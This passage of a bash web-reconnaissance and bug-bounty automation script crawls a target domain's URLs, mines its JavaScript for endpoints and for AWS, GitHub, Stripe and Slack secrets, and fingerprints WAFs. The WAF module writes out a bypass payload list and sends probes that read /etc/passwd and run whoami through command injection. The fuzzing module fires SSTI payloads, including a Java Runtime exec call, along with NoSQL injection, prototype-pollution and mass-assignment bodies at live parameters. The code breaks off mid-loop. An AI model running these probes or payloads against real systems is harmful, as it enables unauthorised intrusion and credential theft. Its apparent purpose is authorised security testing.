        || timeout 180 python3 -m waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" 2>/dev/null || true
    log_ok "waymore: $(cnt "$O/waymore.txt") URLs"
    _curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" \
        | jq -r '.results[]?.page?.url' 2>/dev/null | sort -u > "$O/urlscan.txt" || true
    log_ok "urlscan.io: $(cnt "$O/urlscan.txt") URLs"
    log_info "katana standard crawl..."
    timeout 120 katana -u "https://$DOMAIN" -jc -kf all -d "$D_KATANA" -timeout 10 -c "$T_KATANA" \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} -silent -o "$O/katana_single.txt" 2>/dev/null || true
    log_info "katana list crawl (all live hosts)..."
    timeout 600 katana -list "$LIVE" -jc -kf all -d "$D_KATANA" -timeout 10 -c "$T_KATANA" -p 20 \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} -silent -o "$O/katana_list.txt" 2>/dev/null \
        || log_warn "katana list timed out"
    log_info "katana headless (JS-heavy)..."
    timeout 180 katana -u "https://$DOMAIN" -headless -jc -kf all -d 2 -timeout 15 -c 20 \
        -silent -o "$O/katana_headless.txt" 2>/dev/null || true
    cat "$O/katana_single.txt" "$O/katana_list.txt" "$O/katana_headless.txt" 2>/dev/null \
        | sort -u > "$O/katana.txt"
    log_ok "katana total: $(cnt "$O/katana.txt") URLs"
    log_info "hakrawler (300s cap)..."
    timeout 300 bash -c "cat '$LIVE' | hakrawler -depth 2 -subs -u 2>/dev/null | sort -u > '$O/hakrawler.txt'" \
        || log_warn "hakrawler timed out"
    cat "$O"/*.txt 2>/dev/null | sort -u > "$O/all_urls_raw.txt"
    log_ok "Raw total: $(cnt "$O/all_urls_raw.txt") URLs"
    if has uro; then
        uro < "$O/all_urls_raw.txt" 2>/dev/null > "$O/all_urls.txt" || cp "$O/all_urls_raw.txt" "$O/all_urls.txt"
    else
        cp "$O/all_urls_raw.txt" "$O/all_urls.txt"
    fi
    sort -u -o "$O/all_urls.txt" "$O/all_urls.txt" 2>/dev/null || true
    log_ok "Deduplicated: $(cnt "$O/all_urls.txt") URLs"
    log_info "GF pattern extraction..."
    local GF_PATTERNS=(xss sqli ssrf redirect lfi rce idor interestingparams interestingEXT)
    for p in "${GF_PATTERNS[@]}"; do
        gf "$p" "$O/all_urls.txt" 2>/dev/null | sort -u > "$O/gf/${p}.txt" || true
        local c; c=$(cnt "$O/gf/${p}.txt")
        [[ $c -gt 0 ]] && log_ok "gf[$p]: $c URLs"
    done
    log_info "Filtering URLs to parameter/input/dynamic targets only..."
    grep -E '\?[a-zA-Z0-9_%-]+=' "$O/all_urls.txt" | sort -u > "$O/urls_with_params.txt"
    grep -iE '[?&](id|uid|user|username|email|name|q|query|search|s|key|token|ref|redirect|url|path|file|page|lang|cat|category|type|action|cmd|exec|input|data|val|value|param|p|t|n|m|v|c|i)=[^\&]+' \
        "$O/all_urls.txt" | sort -u > "$O/urls_user_input.txt"
    grep -iE '(/api/|/ajax/|/json|/render|/view|/fetch|/graphql|/rpc|/query|format=json|format=xml|callback=|jsonp=|\.json\?|\.xml\?)' \
        "$O/all_urls.txt" | sort -u > "$O/urls_dynamic.txt"
    grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
        | sed 's/^[?&]//;s/=//' | sort -u > "$WORKSPACE/params/all_params.txt"
    {
        echo "=== ID / Object Reference ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" | grep -iE '(id|uid|oid|rid|cid|pid|sid|uuid|guid|ref|token|key|code|hash)=' | sed 's/^[?&]//;s/=//' | sort -u
        echo ""; echo "=== Search / Query ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" | grep -iE '(q|query|s|search|term|keyword|find|filter|sort|order)=' | sed 's/^[?&]//;s/=//' | sort -u
        echo ""; echo "=== User / Auth ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" | grep -iE '(user|username|email|login|auth|session|pass|account|member|role|admin)=' | sed 's/^[?&]//;s/=//' | sort -u
        echo ""; echo "=== Navigation / Path ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" | grep -iE '(url|redirect|return|next|goto|path|file|dir|page|lang|locale|cat|category|section|tab|view|action|type|format|mode)=' | sed 's/^[?&]//;s/=//' | sort -u
        echo ""; echo "=== Injection Candidates ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" | grep -iE '(cmd|exec|command|input|data|val|value|param|debug|test|payload|template|tpl|include|load|import|src|source)=' | sed 's/^[?&]//;s/=//' | sort -u
    } > "$WORKSPACE/params/params_by_type.txt"
    log_ok "URLs with params    : $(cnt "$O/urls_with_params.txt")"
    log_ok "URLs with user input: $(cnt "$O/urls_user_input.txt")"
    log_ok "URLs dynamic/API    : $(cnt "$O/urls_dynamic.txt")"
    log_ok "Unique param names  : $(cnt "$WORKSPACE/params/all_params.txt")"
}

# ── MODULE 04 — JS ANALYSIS ─────────────────────────────────────────────
mod_js() {
    progress "MODULE 04 — JavaScript Analysis"
    log_section "MODULE 04 — JAVASCRIPT ANALYSIS (CLEAN ENDPOINT MINING)"
    local O="$WORKSPACE/js"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    mkdir -p "$O/downloaded"
    {
        grep -E '\.js(\?|$)' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null
        while IFS= read -r url; do
            has getJS && getJS --url "$url" --complete 2>/dev/null | grep -E '\.js(\?|$)'
        done < "$LIVE"
        grep -E '\.js(\?|$)' "$WORKSPACE/urls/katana.txt" "$WORKSPACE/urls/hakrawler.txt" 2>/dev/null
    } | grep -iE "${DOMAIN}" | sort -u > "$O/js_urls.txt" || true
    log_ok "JS files: $(cnt "$O/js_urls.txt") (target-scoped)"
    log_info "Downloading JS (parallel, cap 200)..."
    local n=0
    while IFS= read -r url && [[ $n -lt 200 ]]; do
        local fname; fname="$O/downloaded/$(safe_name "$url").js"
        [[ -s "$fname" ]] && { n=$((n+1)); continue; }
        _curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
              "$url" -o "$fname" 2>/dev/null &
        n=$((n+1))
        (( n % 20 == 0 )) && { wait 2>/dev/null || true; }
    done < "$O/js_urls.txt"
    wait 2>/dev/null || true
    find "$O/downloaded" -name "*.js" -size -100c -delete 2>/dev/null || true
    for f in "$O/downloaded"/*.js; do
        [[ -f "$f" ]] || continue
        head -c 300 "$f" 2>/dev/null | grep -qiE '<!doctype html|<html|<error' && rm -f "$f"
    done
    log_ok "Downloaded: $(ls "$O/downloaded/"*.js 2>/dev/null | wc -l) files"
    local JS_TMP="$O/.js_all.tmp"
    find "$O/downloaded" -name "*.js" -type f -exec cat {} + > "$JS_TMP" 2>/dev/null || true
    local SQ="'" DQ='"'
    log_info "Mining endpoints (noise-filtered)..."
    if [[ -s "$JS_TMP" ]]; then
        {
            grep -oE 'https?://[a-zA-Z0-9._~:/?#\[\]@!$&()*+,;=%-]+' "$JS_TMP"
            grep -oE "[${SQ}${DQ}](api|v[0-9]|admin|auth|user|account|config|internal|graphql|rest|service|backend|webhook|oauth|sso|upload|export|import|download)/[a-zA-Z0-9._/{}?=&%:-]*[${SQ}${DQ}]" "$JS_TMP"
            grep -oE "(fetch|axios|XMLHttpRequest|open)\([${SQ}${DQ}/][a-zA-Z0-9_./?=&%-]+" "$JS_TMP"
            grep -oE "(get|post|put|delete|patch)\([${SQ}${DQ}/][a-zA-Z0-9_./?=&%-]+" "$JS_TMP"
            grep -oE "url[[:space:]]*[:=][[:space:]]*[${SQ}${DQ}]/[a-zA-Z0-9_./?=&%-]+" "$JS_TMP" | grep -oE '/[a-zA-Z0-9_./?=&%-]+'
            grep -oE "${DQ}[a-zA-Z0-9_./-]{3,}${DQ}[[:space:]]*\+" "$JS_TMP" \
                | sed -E -e 's/^"//' -e 's/"[[:space:]]*\+$//' -e 's|$|/{param}|'
        } \
        | sed -e "s/[\"']//g" -e 's/^\.\///' -e 's#\\/#/#g' \
        | tr -d '`' \
        | grep -vE '\.(js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|map|mp[34]|webm|avi|mov|zip|tar\.?g?z|gz|pdf|docx?|xlsx?|pptx?|min\.js)(\?|$)' \
        | grep -vE '/(static|assets?|images?|img|icons?|fonts?|media|videos?|node_modules|bower_components|vendor|dist|build|public|__webpack|\.well-known)(/|$)' \
        | grep -vE '^(https?:)?//(fonts\.googleapis|fonts\.gstatic|ajax\.googleapis|cdnjs|unpkg|jsdelivr|code\.jquery|cloudflare|google-analytics|googletagmanager|doubleclick|facebook|fbcdn|twitter|youtube|w3\.org|schema\.org|example\.com|localhost|127\.0\.0\.1)(/|$)' \
        | grep -vE '^(data:|chrome|javascript:|mailto:|tel:|blob:)' \
        | grep -vE '(sourceMappingURL|webpack|__webpack_require__|hot-update|manifest\.json|service-worker|favicon|robots\.txt|sitemap\.xml)' \
        | grep -vE '^/[0-9a-f]{20,}' \
        | grep -vE '^$' \
        | sort -u > "$O/js_endpoints_raw.txt"
        log_ok "Raw endpoints (filtered): $(cnt "$O/js_endpoints_raw.txt")"
    else
        touch "$O/js_endpoints_raw.txt"
    fi
    grep -E '^/' "$O/js_endpoints_raw.txt" 2>/dev/null \
        | sed 's/?.*$//; s#/$##' \
        | awk -F/ 'NF>=3 && $2!=""' \
        | grep -iE '(api|v[0-9]|user|admin|auth|account|order|payment|upload|export|import|download|config|graphql|webhook|oauth|token|session|file|image|document|report|search|query|notification|message|product|cart|checkout|invoice|billing|profile|member|role|permission|invite|team|org|project|task|setting|preference)' \
        | sort -u > "$O/js_api_routes.txt"
    log_ok "API routes: $(cnt "$O/js_api_routes.txt")"
    log_info "Secret mining..."
    if [[ -s "$JS_TMP" ]]; then
        echo "AKIA keys:     $(grep -oE 'AKIA[0-9A-Z]{16}' "$JS_TMP" | sort -u | tee "$O/aws_keys.txt" | wc -l)"
        echo "GCP keys:      $(grep -oE 'AIza[0-9A-Za-z_-]{35}' "$JS_TMP" | sort -u | tee "$O/gcp_keys.txt" | wc -l)"
        echo "Stripe keys:   $(grep -oE 'sk-(live|test)-[a-zA-Z0-9]{20,}' "$JS_TMP" | sort -u | tee "$O/stripe_keys.txt" | wc -l)"
        echo "GitHub tokens: $(grep -oE 'ghp_[a-zA-Z0-9]{36}' "$JS_TMP" | sort -u | tee "$O/github_tokens.txt" | wc -l)"
        echo "Slack tokens:  $(grep -oE 'xox[baprs]-[a-zA-Z0-9-]{10,}' "$JS_TMP" | sort -u | tee "$O/slack_tokens.txt" | wc -l)"
        echo "JWTs:          $(grep -oE 'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*' "$JS_TMP" | sort -u | tee "$O/jwt_tokens.txt" | wc -l)"
        grep -oiE "(api[_-]?key|apikey|secret|client[_-]?secret|access[_-]?token|auth[_-]?token|private[_-]?key|password|passwd|pwd|bearer)[\"' ]*[:=][\"' ][a-zA-Z0-9._/+=-]{12,}[\"']" "$JS_TMP" \
            | grep -viE '(your|example|xxxx|test_|placeholder|changeme|undefined|null|true|false|000000|api_key_here)' \
            | sort -u > "$O/potential_secrets.txt"
        grep -oiE '(innerHTML|outerHTML|document\.write|\.html\(|eval\(|setTimeout\(|setInterval\()' "$JS_TMP" | sort -u > "$O/dom_xss_sinks.txt"
        grep -oE '[a-zA-Z0-9_-]+\.s3[\.-][a-zA-Z0-9.-]*\.amazonaws\.com' "$JS_TMP" | sort -u > "$O/s3_in_js.txt"
        grep -oiE "(baseURL|apiBase|API_URL|api_url|endpoint)[\"' ]*[:=][\"' ][a-zA-Z0-9./:_-]{5,}[\"']" "$JS_TMP" | sort -u > "$O/api_base_urls.txt"
        cat "$O/aws_keys.txt" "$O/gcp_keys.txt" "$O/stripe_keys.txt" \
            "$O/github_tokens.txt" "$O/slack_tokens.txt" "$O/potential_secrets.txt" 2>/dev/null \
            | grep -vE '^$' | sort -u > "$O/secrets_found.txt"
        [[ -s "$O/secrets_found.txt" ]] && log_hit "SECRETS IN JS: $(cnt "$O/secrets_found.txt") unique lines"
    else
        for f in aws_keys gcp_keys stripe_keys github_tokens slack_tokens potential_secrets \
                 jwt_tokens dom_xss_sinks s3_in_js api_base_urls secrets_found; do touch "$O/${f}.txt"; done
    fi
    if [[ -f "$HOME/tools/LinkFinder/linkfinder.py" ]]; then
        find "$O/downloaded" -name "*.js" -type f 2>/dev/null | head -200 | while IFS= read -r jsfile; do
            python3 "$HOME/tools/LinkFinder/linkfinder.py" -i "$jsfile" -o cli 2>/dev/null || true
        done | sort -u > "$O/linkfinder_endpoints.txt" || true
    else
        touch "$O/linkfinder_endpoints.txt"
    fi
    cat "$O/js_endpoints_raw.txt" "$O/linkfinder_endpoints.txt" 2>/dev/null | sort -u > "$O/all_js_endpoints.txt"
    log_ok "JS endpoints total: $(cnt "$O/all_js_endpoints.txt")"
    cat "$O/js_api_routes.txt" "$O/all_js_endpoints.txt" 2>/dev/null \
        | sort -u >> "$WORKSPACE/endpoints/all_endpoints.txt"
    sort -u -o "$WORKSPACE/endpoints/all_endpoints.txt" "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null || true
    log_ok "mod_js complete → $O/"
}

# ── MODULE WAF ──────────────────────────────────────────────────────────
mod_waf() {
    progress "MODULE WAF — WAF Fingerprinting & Bypass Profiling"
    log_section "MODULE WAF — WAF FINGERPRINTING"
    local O="$WORKSPACE/waf"; mkdir -p "$O"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    if has wafw00f; then
        log_info "wafw00f passive+active detection..."
        while IFS= read -r url; do
            wafw00f "$url" -a -o "$O/wafw00f_$(safe_name "$url").json" --format=json 2>/dev/null || true
        done < <(head -10 "$LIVE" 2>/dev/null)
        find "$O" -name "wafw00f_*.json" -exec jq -r '.detected[]? | "\(.waf) | \(.url)"' {} 2>/dev/null \; \
            | sort -u > "$O/waf_detected.txt" || true
        if [[ -s "$O/waf_detected.txt" ]]; then
            log_warn "WAFs detected:"
            cat "$O/waf_detected.txt" | while IFS= read -r line; do log_warn "  $line"; done
        else
            log_ok "No WAF detected by wafw00f (or unrecognised)"
        fi
    else
        log_warn "wafw00f not installed — skipping passive detection (header probes still run)"
    fi
    log_info "Header mutation fingerprinting..."
    local MAIN; MAIN=$(head -1 "$LIVE" 2>/dev/null)
    [[ -z "$MAIN" ]] && MAIN="https://$DOMAIN"
    declare -A WAF_SIGS=(
        ["Cloudflare"]="cf-ray|cloudflare"
        ["Akamai"]="akamai|x-akamai"
        ["AWS WAF"]="x-amzn-requestid|x-amz-cf-id"
        ["Imperva/Incapsula"]="x-iinfo|incap_ses|visid_incap"
        ["F5 BIG-IP"]="x-wa-info|ts=[0-9a-f]"
        ["Sucuri"]="x-sucuri-id|sucuri"
        ["Fastly"]="x-fastly|fastly"
        ["ModSecurity"]="mod_security|modsec"
    )
    local hdrs; hdrs=$(_curl -I "$MAIN" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    for waf in "${!WAF_SIGS[@]}"; do
        local sig="${WAF_SIGS[$waf]}"
        if echo "$hdrs" | grep -qiE "$sig"; then
            echo "HEADER_MATCH: $waf" >> "$O/waf_header_match.txt"
            log_warn "WAF header match: $waf"
        fi
    done
    sort -u -o "$O/waf_header_match.txt" "$O/waf_header_match.txt" 2>/dev/null || true
    log_info "WAF behavior probes (block/pass/transform)..."
    local -a PROBES=(
        "/?__test__=<script>alert(1)</script>"
        "/?__test__=' OR 1=1--"
        "/?__test__=../../../etc/passwd"
        "/?__test__=; cat /etc/passwd"
        "/?__test__={{7*7}}"
        "/?__test__=|whoami"
    )
    local -a LABELS=("XSS" "SQLi" "LFI" "CMDi" "SSTI" "CMDi2")
    for i in "${!PROBES[@]}"; do
        local probe="${PROBES[$i]}" label="${LABELS[$i]}"
        local resp_code; resp_code=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${probe}" 2>/dev/null || echo "000")
        local resp_body; resp_body=$(_curl -s "${MAIN}${probe}" 2>/dev/null | head -c 2000 || true)
        local result="PASS[$resp_code]"
        echo "$resp_body" | grep -qiE "(blocked|forbidden|access denied|request denied|detected|firewall|illegal|malicious|attack)" \
            && result="BLOCKED[$resp_code]"
        [[ "$resp_code" == "403" || "$resp_code" == "406" || "$resp_code" == "429" || "$resp_code" == "503" ]] \
            && result="BLOCKED[$resp_code]"
        echo "[$label] $result  ${MAIN}${probe}" >> "$O/waf_probe_results.txt"
    done
    sort -u -o "$O/waf_probe_results.txt" "$O/waf_probe_results.txt" 2>/dev/null || true
    log_ok "WAF probe results → $O/waf_probe_results.txt"
    if [[ -s "$O/waf_detected.txt" || -s "$O/waf_header_match.txt" ]]; then
        log_info "Generating WAF bypass mutation set..."
        cat > "$O/waf_bypass_payloads.txt" << 'WAFBYPASS'
# XSS bypasses
<ScRiPt>alert(1)</sCrIpT>
<img src=x oNeRrOr=alert(1)>
<svg/onload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
<a href="javas&#99;ript:alert(1)">
# SQLi bypasses
'/**/OR/**/1=1--
'%09OR%091=1--
' /*!OR*/ 1=1--
1'||'1'='1
# LFI bypasses
....//....//etc/passwd
..%252f..%252fetc/passwd
%2e%2e%2fetc%2fpasswd
php://filter/read=convert.base64-encode/resource=index.php
# SSTI bypasses
{{7*'7'}}
'${7*7}'
<%= 7*7 %>
WAFBYPASS
        log_ok "WAF bypass payloads written → $O/waf_bypass_payloads.txt"
    fi
    log_info "Rate-limit threshold probe (20 rapid requests)..."
    local block_count=0
    for i in $(seq 1 20); do
        local c; c=$(_curl -o /dev/null -w "%{http_code}" "$MAIN" 2>/dev/null || echo "000")
        [[ "$c" == "429" || "$c" == "503" ]] && ((block_count++))
    done
    echo "rate_limit_blocks_in_20_req=$block_count" >> "$O/waf_probe_results.txt"
    [[ $block_count -gt 0 ]] && log_warn "Rate limiting detected: $block_count/20 requests blocked" \
        || log_ok "No rate limiting on 20 rapid requests"
    log_ok "WAF fingerprinting complete → $O/"
}

# ── MODULE API — API SCHEMA ─────────────────────────────────────────────
mod_api_schema() {
    progress "MODULE API — API Schema Discovery"
    log_section "MODULE API — API SCHEMA DISCOVERY (OpenAPI/GraphQL)"
    local O="$WORKSPACE/api_schema"; mkdir -p "$O"/{openapi,graphql,undocumented}
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    log_info "OpenAPI/Swagger spec hunting..."
    local -a API_PATHS=(
        "/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json" "/swagger-ui.html" "/swagger-ui/"
        "/api-docs" "/api-docs.json" "/api/swagger.json" "/api/v1/swagger.json" "/api/v2/swagger.json"
        "/openapi.json" "/openapi.yaml" "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
        "/api/openapi.json" "/redoc" "/.well-known/openapi" "/api/schema/"
    )
    while IFS= read -r base; do
        for path in "${API_PATHS[@]}"; do
            local url="${base}${path}"
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            if [[ "$code" == "200" ]]; then
                local body; body=$(_curl "$url" 2>/dev/null || true)
                if echo "$body" | grep -qiE "(swagger|openapi|paths|info|endpoints)"; then
                    echo "$url" >> "$O/openapi/specs_found.txt"
                    local fname="$O/openapi/$(safe_name "$url").json"
                    echo "$body" > "$fname"
                    log_hit "API SPEC FOUND: $url"
                    echo "$body" | jq -r '.paths | keys[]?' 2>/dev/null >> "$O/openapi/spec_endpoints.txt" || true
                fi
            fi
        done
    done < <(head -15 "$LIVE" 2>/dev/null)
    touch "$O/openapi/spec_endpoints.txt" "$O/openapi/specs_found.txt" 2>/dev/null || true
    sort -u -o "$O/openapi/spec_endpoints.txt" "$O/openapi/spec_endpoints.txt" 2>/dev/null || true
    sort -u -o "$O/openapi/specs_found.txt" "$O/openapi/specs_found.txt" 2>/dev/null || true
    log_ok "OpenAPI specs: $(cnt "$O/openapi/specs_found.txt") | Endpoints in specs: $(cnt "$O/openapi/spec_endpoints.txt")"
    log_info "GraphQL endpoint detection + introspection..."
    local -a GQL_PATHS=("/graphql" "/api/graphql" "/graphql/v1" "/v1/graphql" "/graphiql" "/gql" "/query" "/api/query")
    while IFS= read -r base; do
        for path in "${GQL_PATHS[@]}"; do
            local url="${base}${path}"
            local resp; resp=$(_curl -X POST -H "Content-Type: application/json" \
                -d '{"query":"{ __typename }"}' "$url" 2>/dev/null || true)
            if echo "$resp" | grep -qiE "(data|__typename|errors)" && echo "$resp" | grep -q "{"; then
                echo "GQL_ENDPOINT: $url" >> "$O/graphql/endpoints.txt"
                log_hit "GraphQL endpoint: $url"
                local INTROSPECTION_Q='{"query":"{ __schema { queryType { name } types { name kind fields { name args { name type { name kind } } } } } }"}'
                local schema; schema=$(_curl -X POST -H "Content-Type: application/json" \
                    -d "$INTROSPECTION_Q" "$url" 2>/dev/null || true)
                if echo "$schema" | grep -qiE "__schema|queryType"; then
                    echo "$schema" > "$O/graphql/schema_$(safe_name "$url").json"
                    log_hit "GraphQL introspection enabled: $url"
                    echo "INTROSPECTION_OPEN: $url" >> "$O/graphql/introspection_open.txt"
                    echo "$schema" | jq -r '.data.__schema.types[]?.name' 2>/dev/null \
                        | grep -v "^__" | sort -u >> "$O/graphql/type_names.txt" || true
                else
                    echo "INTROSPECTION_DISABLED: $url" >> "$O/graphql/introspection_disabled.txt"
                fi
                local batch_resp; batch_resp=$(_curl -X POST -H "Content-Type: application/json" \
                    -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]' "$url" 2>/dev/null || true)
                echo "$batch_resp" | grep -qiE "(data|__typename)" \
                    && echo "BATCH_ENABLED: $url" >> "$O/graphql/batch_enabled.txt" \
                    && log_warn "GraphQL batching enabled (rate-limit bypass): $url"
                local depth_q='{"query":"{ a: __typename b: __typename c: __typename d: __typename e: __typename f: __typename g: __typename h: __typename i: __typename j: __typename }"}'
                _curl -X POST -H "Content-Type: application/json" -d "$depth_q" "$url" 2>/dev/null \
                    | grep -qiE "(error|limit|exceeded)" \
                    || echo "NO_DEPTH_LIMIT: $url" >> "$O/graphql/no_depth_limit.txt" || true
            fi
        done
    done < <(head -15 "$LIVE" 2>/dev/null)
    for f in endpoints introspection_open introspection_disabled batch_enabled no_depth_limit; do
        sort -u -o "$O/graphql/${f}.txt" "$O/graphql/${f}.txt" 2>/dev/null || true
    done
    log_ok "GraphQL endpoints: $(cnt "$O/graphql/endpoints.txt") | Introspection open: $(cnt "$O/graphql/introspection_open.txt")"
    log_info "API version + undocumented path fuzzing..."
    local MAIN="https://$DOMAIN"
    local -a API_VERSIONS=("v1" "v2" "v3" "v4" "v5" "v1.0" "v2.0" "latest" "beta" "alpha" "dev" "internal")
    local -a API_BASES=("/api" "/api/rest" "/rest" "/service" "/services" "/backend")
    local -a API_RESOURCES=("users" "user" "accounts" "account" "orders" "order" "products" "product"
                             "admin" "config" "settings" "payments" "invoices" "customers" "members"
                             "reports" "export" "import" "upload" "auth" "tokens" "keys" "webhooks"
                             "roles" "permissions" "groups" "events" "logs" "audit" "metrics")
    for base in "${API_BASES[@]}"; do
        for ver in "${API_VERSIONS[@]}"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${base}/${ver}" 2>/dev/null || echo "000")
            if [[ "$c" =~ ^(200|201|401|403)$ ]]; then
                echo "API_BASE_FOUND [${c}]: ${MAIN}${base}/${ver}" >> "$O/undocumented/api_bases.txt"
                for res in "${API_RESOURCES[@]}"; do
                    local rc; rc=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${base}/${ver}/${res}" 2>/dev/null || echo "000")
                    [[ "$rc" =~ ^(200|201|401|403)$ ]] && \
                        echo "API_RESOURCE [${rc}]: ${MAIN}${base}/${ver}/${res}" >> "$O/undocumented/api_resources.txt"
                done
            fi
        done
    done
    sort -u -o "$O/undocumented/api_bases.txt" "$O/undocumented/api_bases.txt" 2>/dev/null || true
    sort -u -o "$O/undocumented/api_resources.txt" "$O/undocumented/api_resources.txt" 2>/dev/null || true
    log_ok "Undocumented API bases: $(cnt "$O/undocumented/api_bases.txt") | resources: $(cnt "$O/undocumented/api_resources.txt")"
    cat "$O/openapi/spec_endpoints.txt" "$O/graphql/endpoints.txt" \
        "$O/undocumented/api_resources.txt" 2>/dev/null >> "$WORKSPACE/endpoints/interesting_paths.txt" || true
    sort -u -o "$WORKSPACE/endpoints/interesting_paths.txt" "$WORKSPACE/endpoints/interesting_paths.txt" 2>/dev/null || true
    log_ok "API schema discovery complete → $O/"
}

# ── MODULE PMF — PARAM MUTATION FUZZING ─────────────────────────────────
mod_param_fuzz() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE PMF — Parameter Mutation Fuzzing"
    log_section "MODULE PMF — PARAMETER MUTATION FUZZING (SSTI/Type Confusion/Hidden Params)"
    local O="$WORKSPACE/vulns/param_fuzz"
    mkdir -p "$O"/{ssti,type_confusion,hidden_params,json_xml}
    touch "$O/ssti/ssti_confirmed.txt" "$O/ssti/ssti_error.txt" "$O/type_confusion/findings.txt" \
          "$O/json_xml/json_hits.txt" "$O/json_xml/json_500.txt" "$O/hidden_params/discovered_params.txt" 2>/dev/null || true
    local PARAMS_IN="$WORKSPACE/urls/urls_with_params.txt"
    log_info "SSTI detection (Jinja2/Twig/Freemarker/Pebble/Velocity/ERB)..."
    local -a SSTI_PAYLOADS=(
        "{{7*7}}" "{{7*'7'}}" '${7*7}' "<%= 7*7 %>" "#{7*7}" "*{7*7}"
        '{{config}}' '{{self}}' "{{'7'*7}}" "{%print(7*7)%}" "{% debug %}" "{{dump(app)}}"
        'T(java.lang.Runtime).getRuntime().exec("id")'
    )
    while IFS= read -r url; do
        for payload in "${SSTI_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local resp; resp=$(_curl "$furl" 2>/dev/null | head -c 3000 || true)
            if echo "$resp" | grep -qP "\b49\b|\b7777777\b"; then
                uniq_add "$O/ssti/ssti_confirmed.txt" "SSTI_CONFIRMED: $furl (payload: $payload)"
                log_hit "SSTI CONFIRMED: $furl"
            elif echo "$resp" | grep -qiE "(template|render|jinja|twig|freemarker|velocity|smarty|mako).*error"; then
                uniq_add "$O/ssti/ssti_error.txt" "SSTI_ERROR_LEAK: $furl"
            fi
        done
    done < <(head -150 "$PARAMS_IN" 2>/dev/null)
    log_ok "SSTI confirmed: $(cnt "$O/ssti/ssti_confirmed.txt")"
    log_info "Type confusion / mass assignment probes..."
    local -a TYPE_MUTATIONS=(
        "0" "-1" "999999999" "null" "undefined" "true" "false" "[]" "{}" "[null]"
        "NaN" "Infinity" "0.0" "1e308" "0x41" "1.1.1" "%00" "'OR 1=1--" "<script>" "{{7*7}}"
    )
    while IFS= read -r url; do
        for mut in "${TYPE_MUTATIONS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$mut" 2>/dev/null || true)
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$furl" 2>/dev/null || echo "000")
            local body; body=$(_curl "$furl" 2>/dev/null | head -c 2000 || true)
            if [[ "$code" == "500" ]] || echo "$body" | grep -qiE "(stack trace|unhandled exception|typeerror|valueerror|null pointer|undefined method|cannot read property|parse error|invalid.*type|expected.*number|expected.*string)"; then
                uniq_add "$O/type_confusion/findings.txt" "TYPE_CONFUSION [${code}] (${mut}): $furl"
            fi
        done
    done < <(head -80 "$PARAMS_IN" 2>/dev/null)
    log_ok "Type confusion findings: $(cnt "$O/type_confusion/findings.txt")"
    log_info "Hidden parameter discovery (ParamMiner-style ffuf)..."
    local PARAM_WL; PARAM_WL=$(pick_wl /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
        "$HOME/tools/wordlists/burp-parameter-names.txt" /usr/share/wordlists/dirb/common.txt)
    while IFS= read -r url; do
        local base_url="${url%%\?*}"
        local s; s=$(safe_name "$url")
        _ffuf -u "${base_url}?FUZZ=bugbounty_test" -w "$PARAM_WL" -t 50 -mc 200,201,302 -fs 0 \
            -of json -o "$O/hidden_params/ffuf_get_${s}.json" -s 2>/dev/null || true
        _ffuf -u "$base_url" -X POST -d "FUZZ=bugbounty_test" -H "Content-Type: application/x-www-form-urlencoded" \
            -w "$PARAM_WL" -t 50 -mc 200,201,302 -fs 0 \
            -of json -o "$O/hidden_params/ffuf_post_${s}.json" -s 2>/dev/null || true
    done < <(head -30 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null)
    find "$O/hidden_params" -name "*.json" -size +10c 2>/dev/null \
        | xargs -I{} jq -r '.results[]?.input.FUZZ' {} 2>/dev/null \
        | sort -u > "$O/hidden_params/discovered_params.txt" || true
    log_ok "Hidden params discovered: $(cnt "$O/hidden_params/discovered_params.txt")"
    log_info "JSON/XML body mutation on API endpoints..."
    local API_URLS="$WORKSPACE/urls/urls_dynamic.txt"
    [[ ! -s "$API_URLS" ]] && API_URLS="$WORKSPACE/urls/urls_with_params.txt"
    local -a JSON_PAYLOADS=(
        '{"__proto__":{"admin":true}}'
        '{"constructor":{"prototype":{"admin":true}}}'
        '{"$where":"sleep(1000)"}'
        '{"$gt":"","$ne":""}'
        '{"id":{"$gt":0}}'
        '{"role":"admin","is_admin":true,"privilege":9999}'
    )
    local -a JSON_LABELS=("prototype_pollution" "constructor_pollution" "nosqli_where" "nosqli_ne" "nosqli_gt" "mass_assign")
    while IFS= read -r url; do
        for i in "${!JSON_PAYLOADS[@]}"; do
            local payload="${JSON_PAYLOADS[$i]}" label="${JSON_LABELS[$i]}"
            local resp_code body
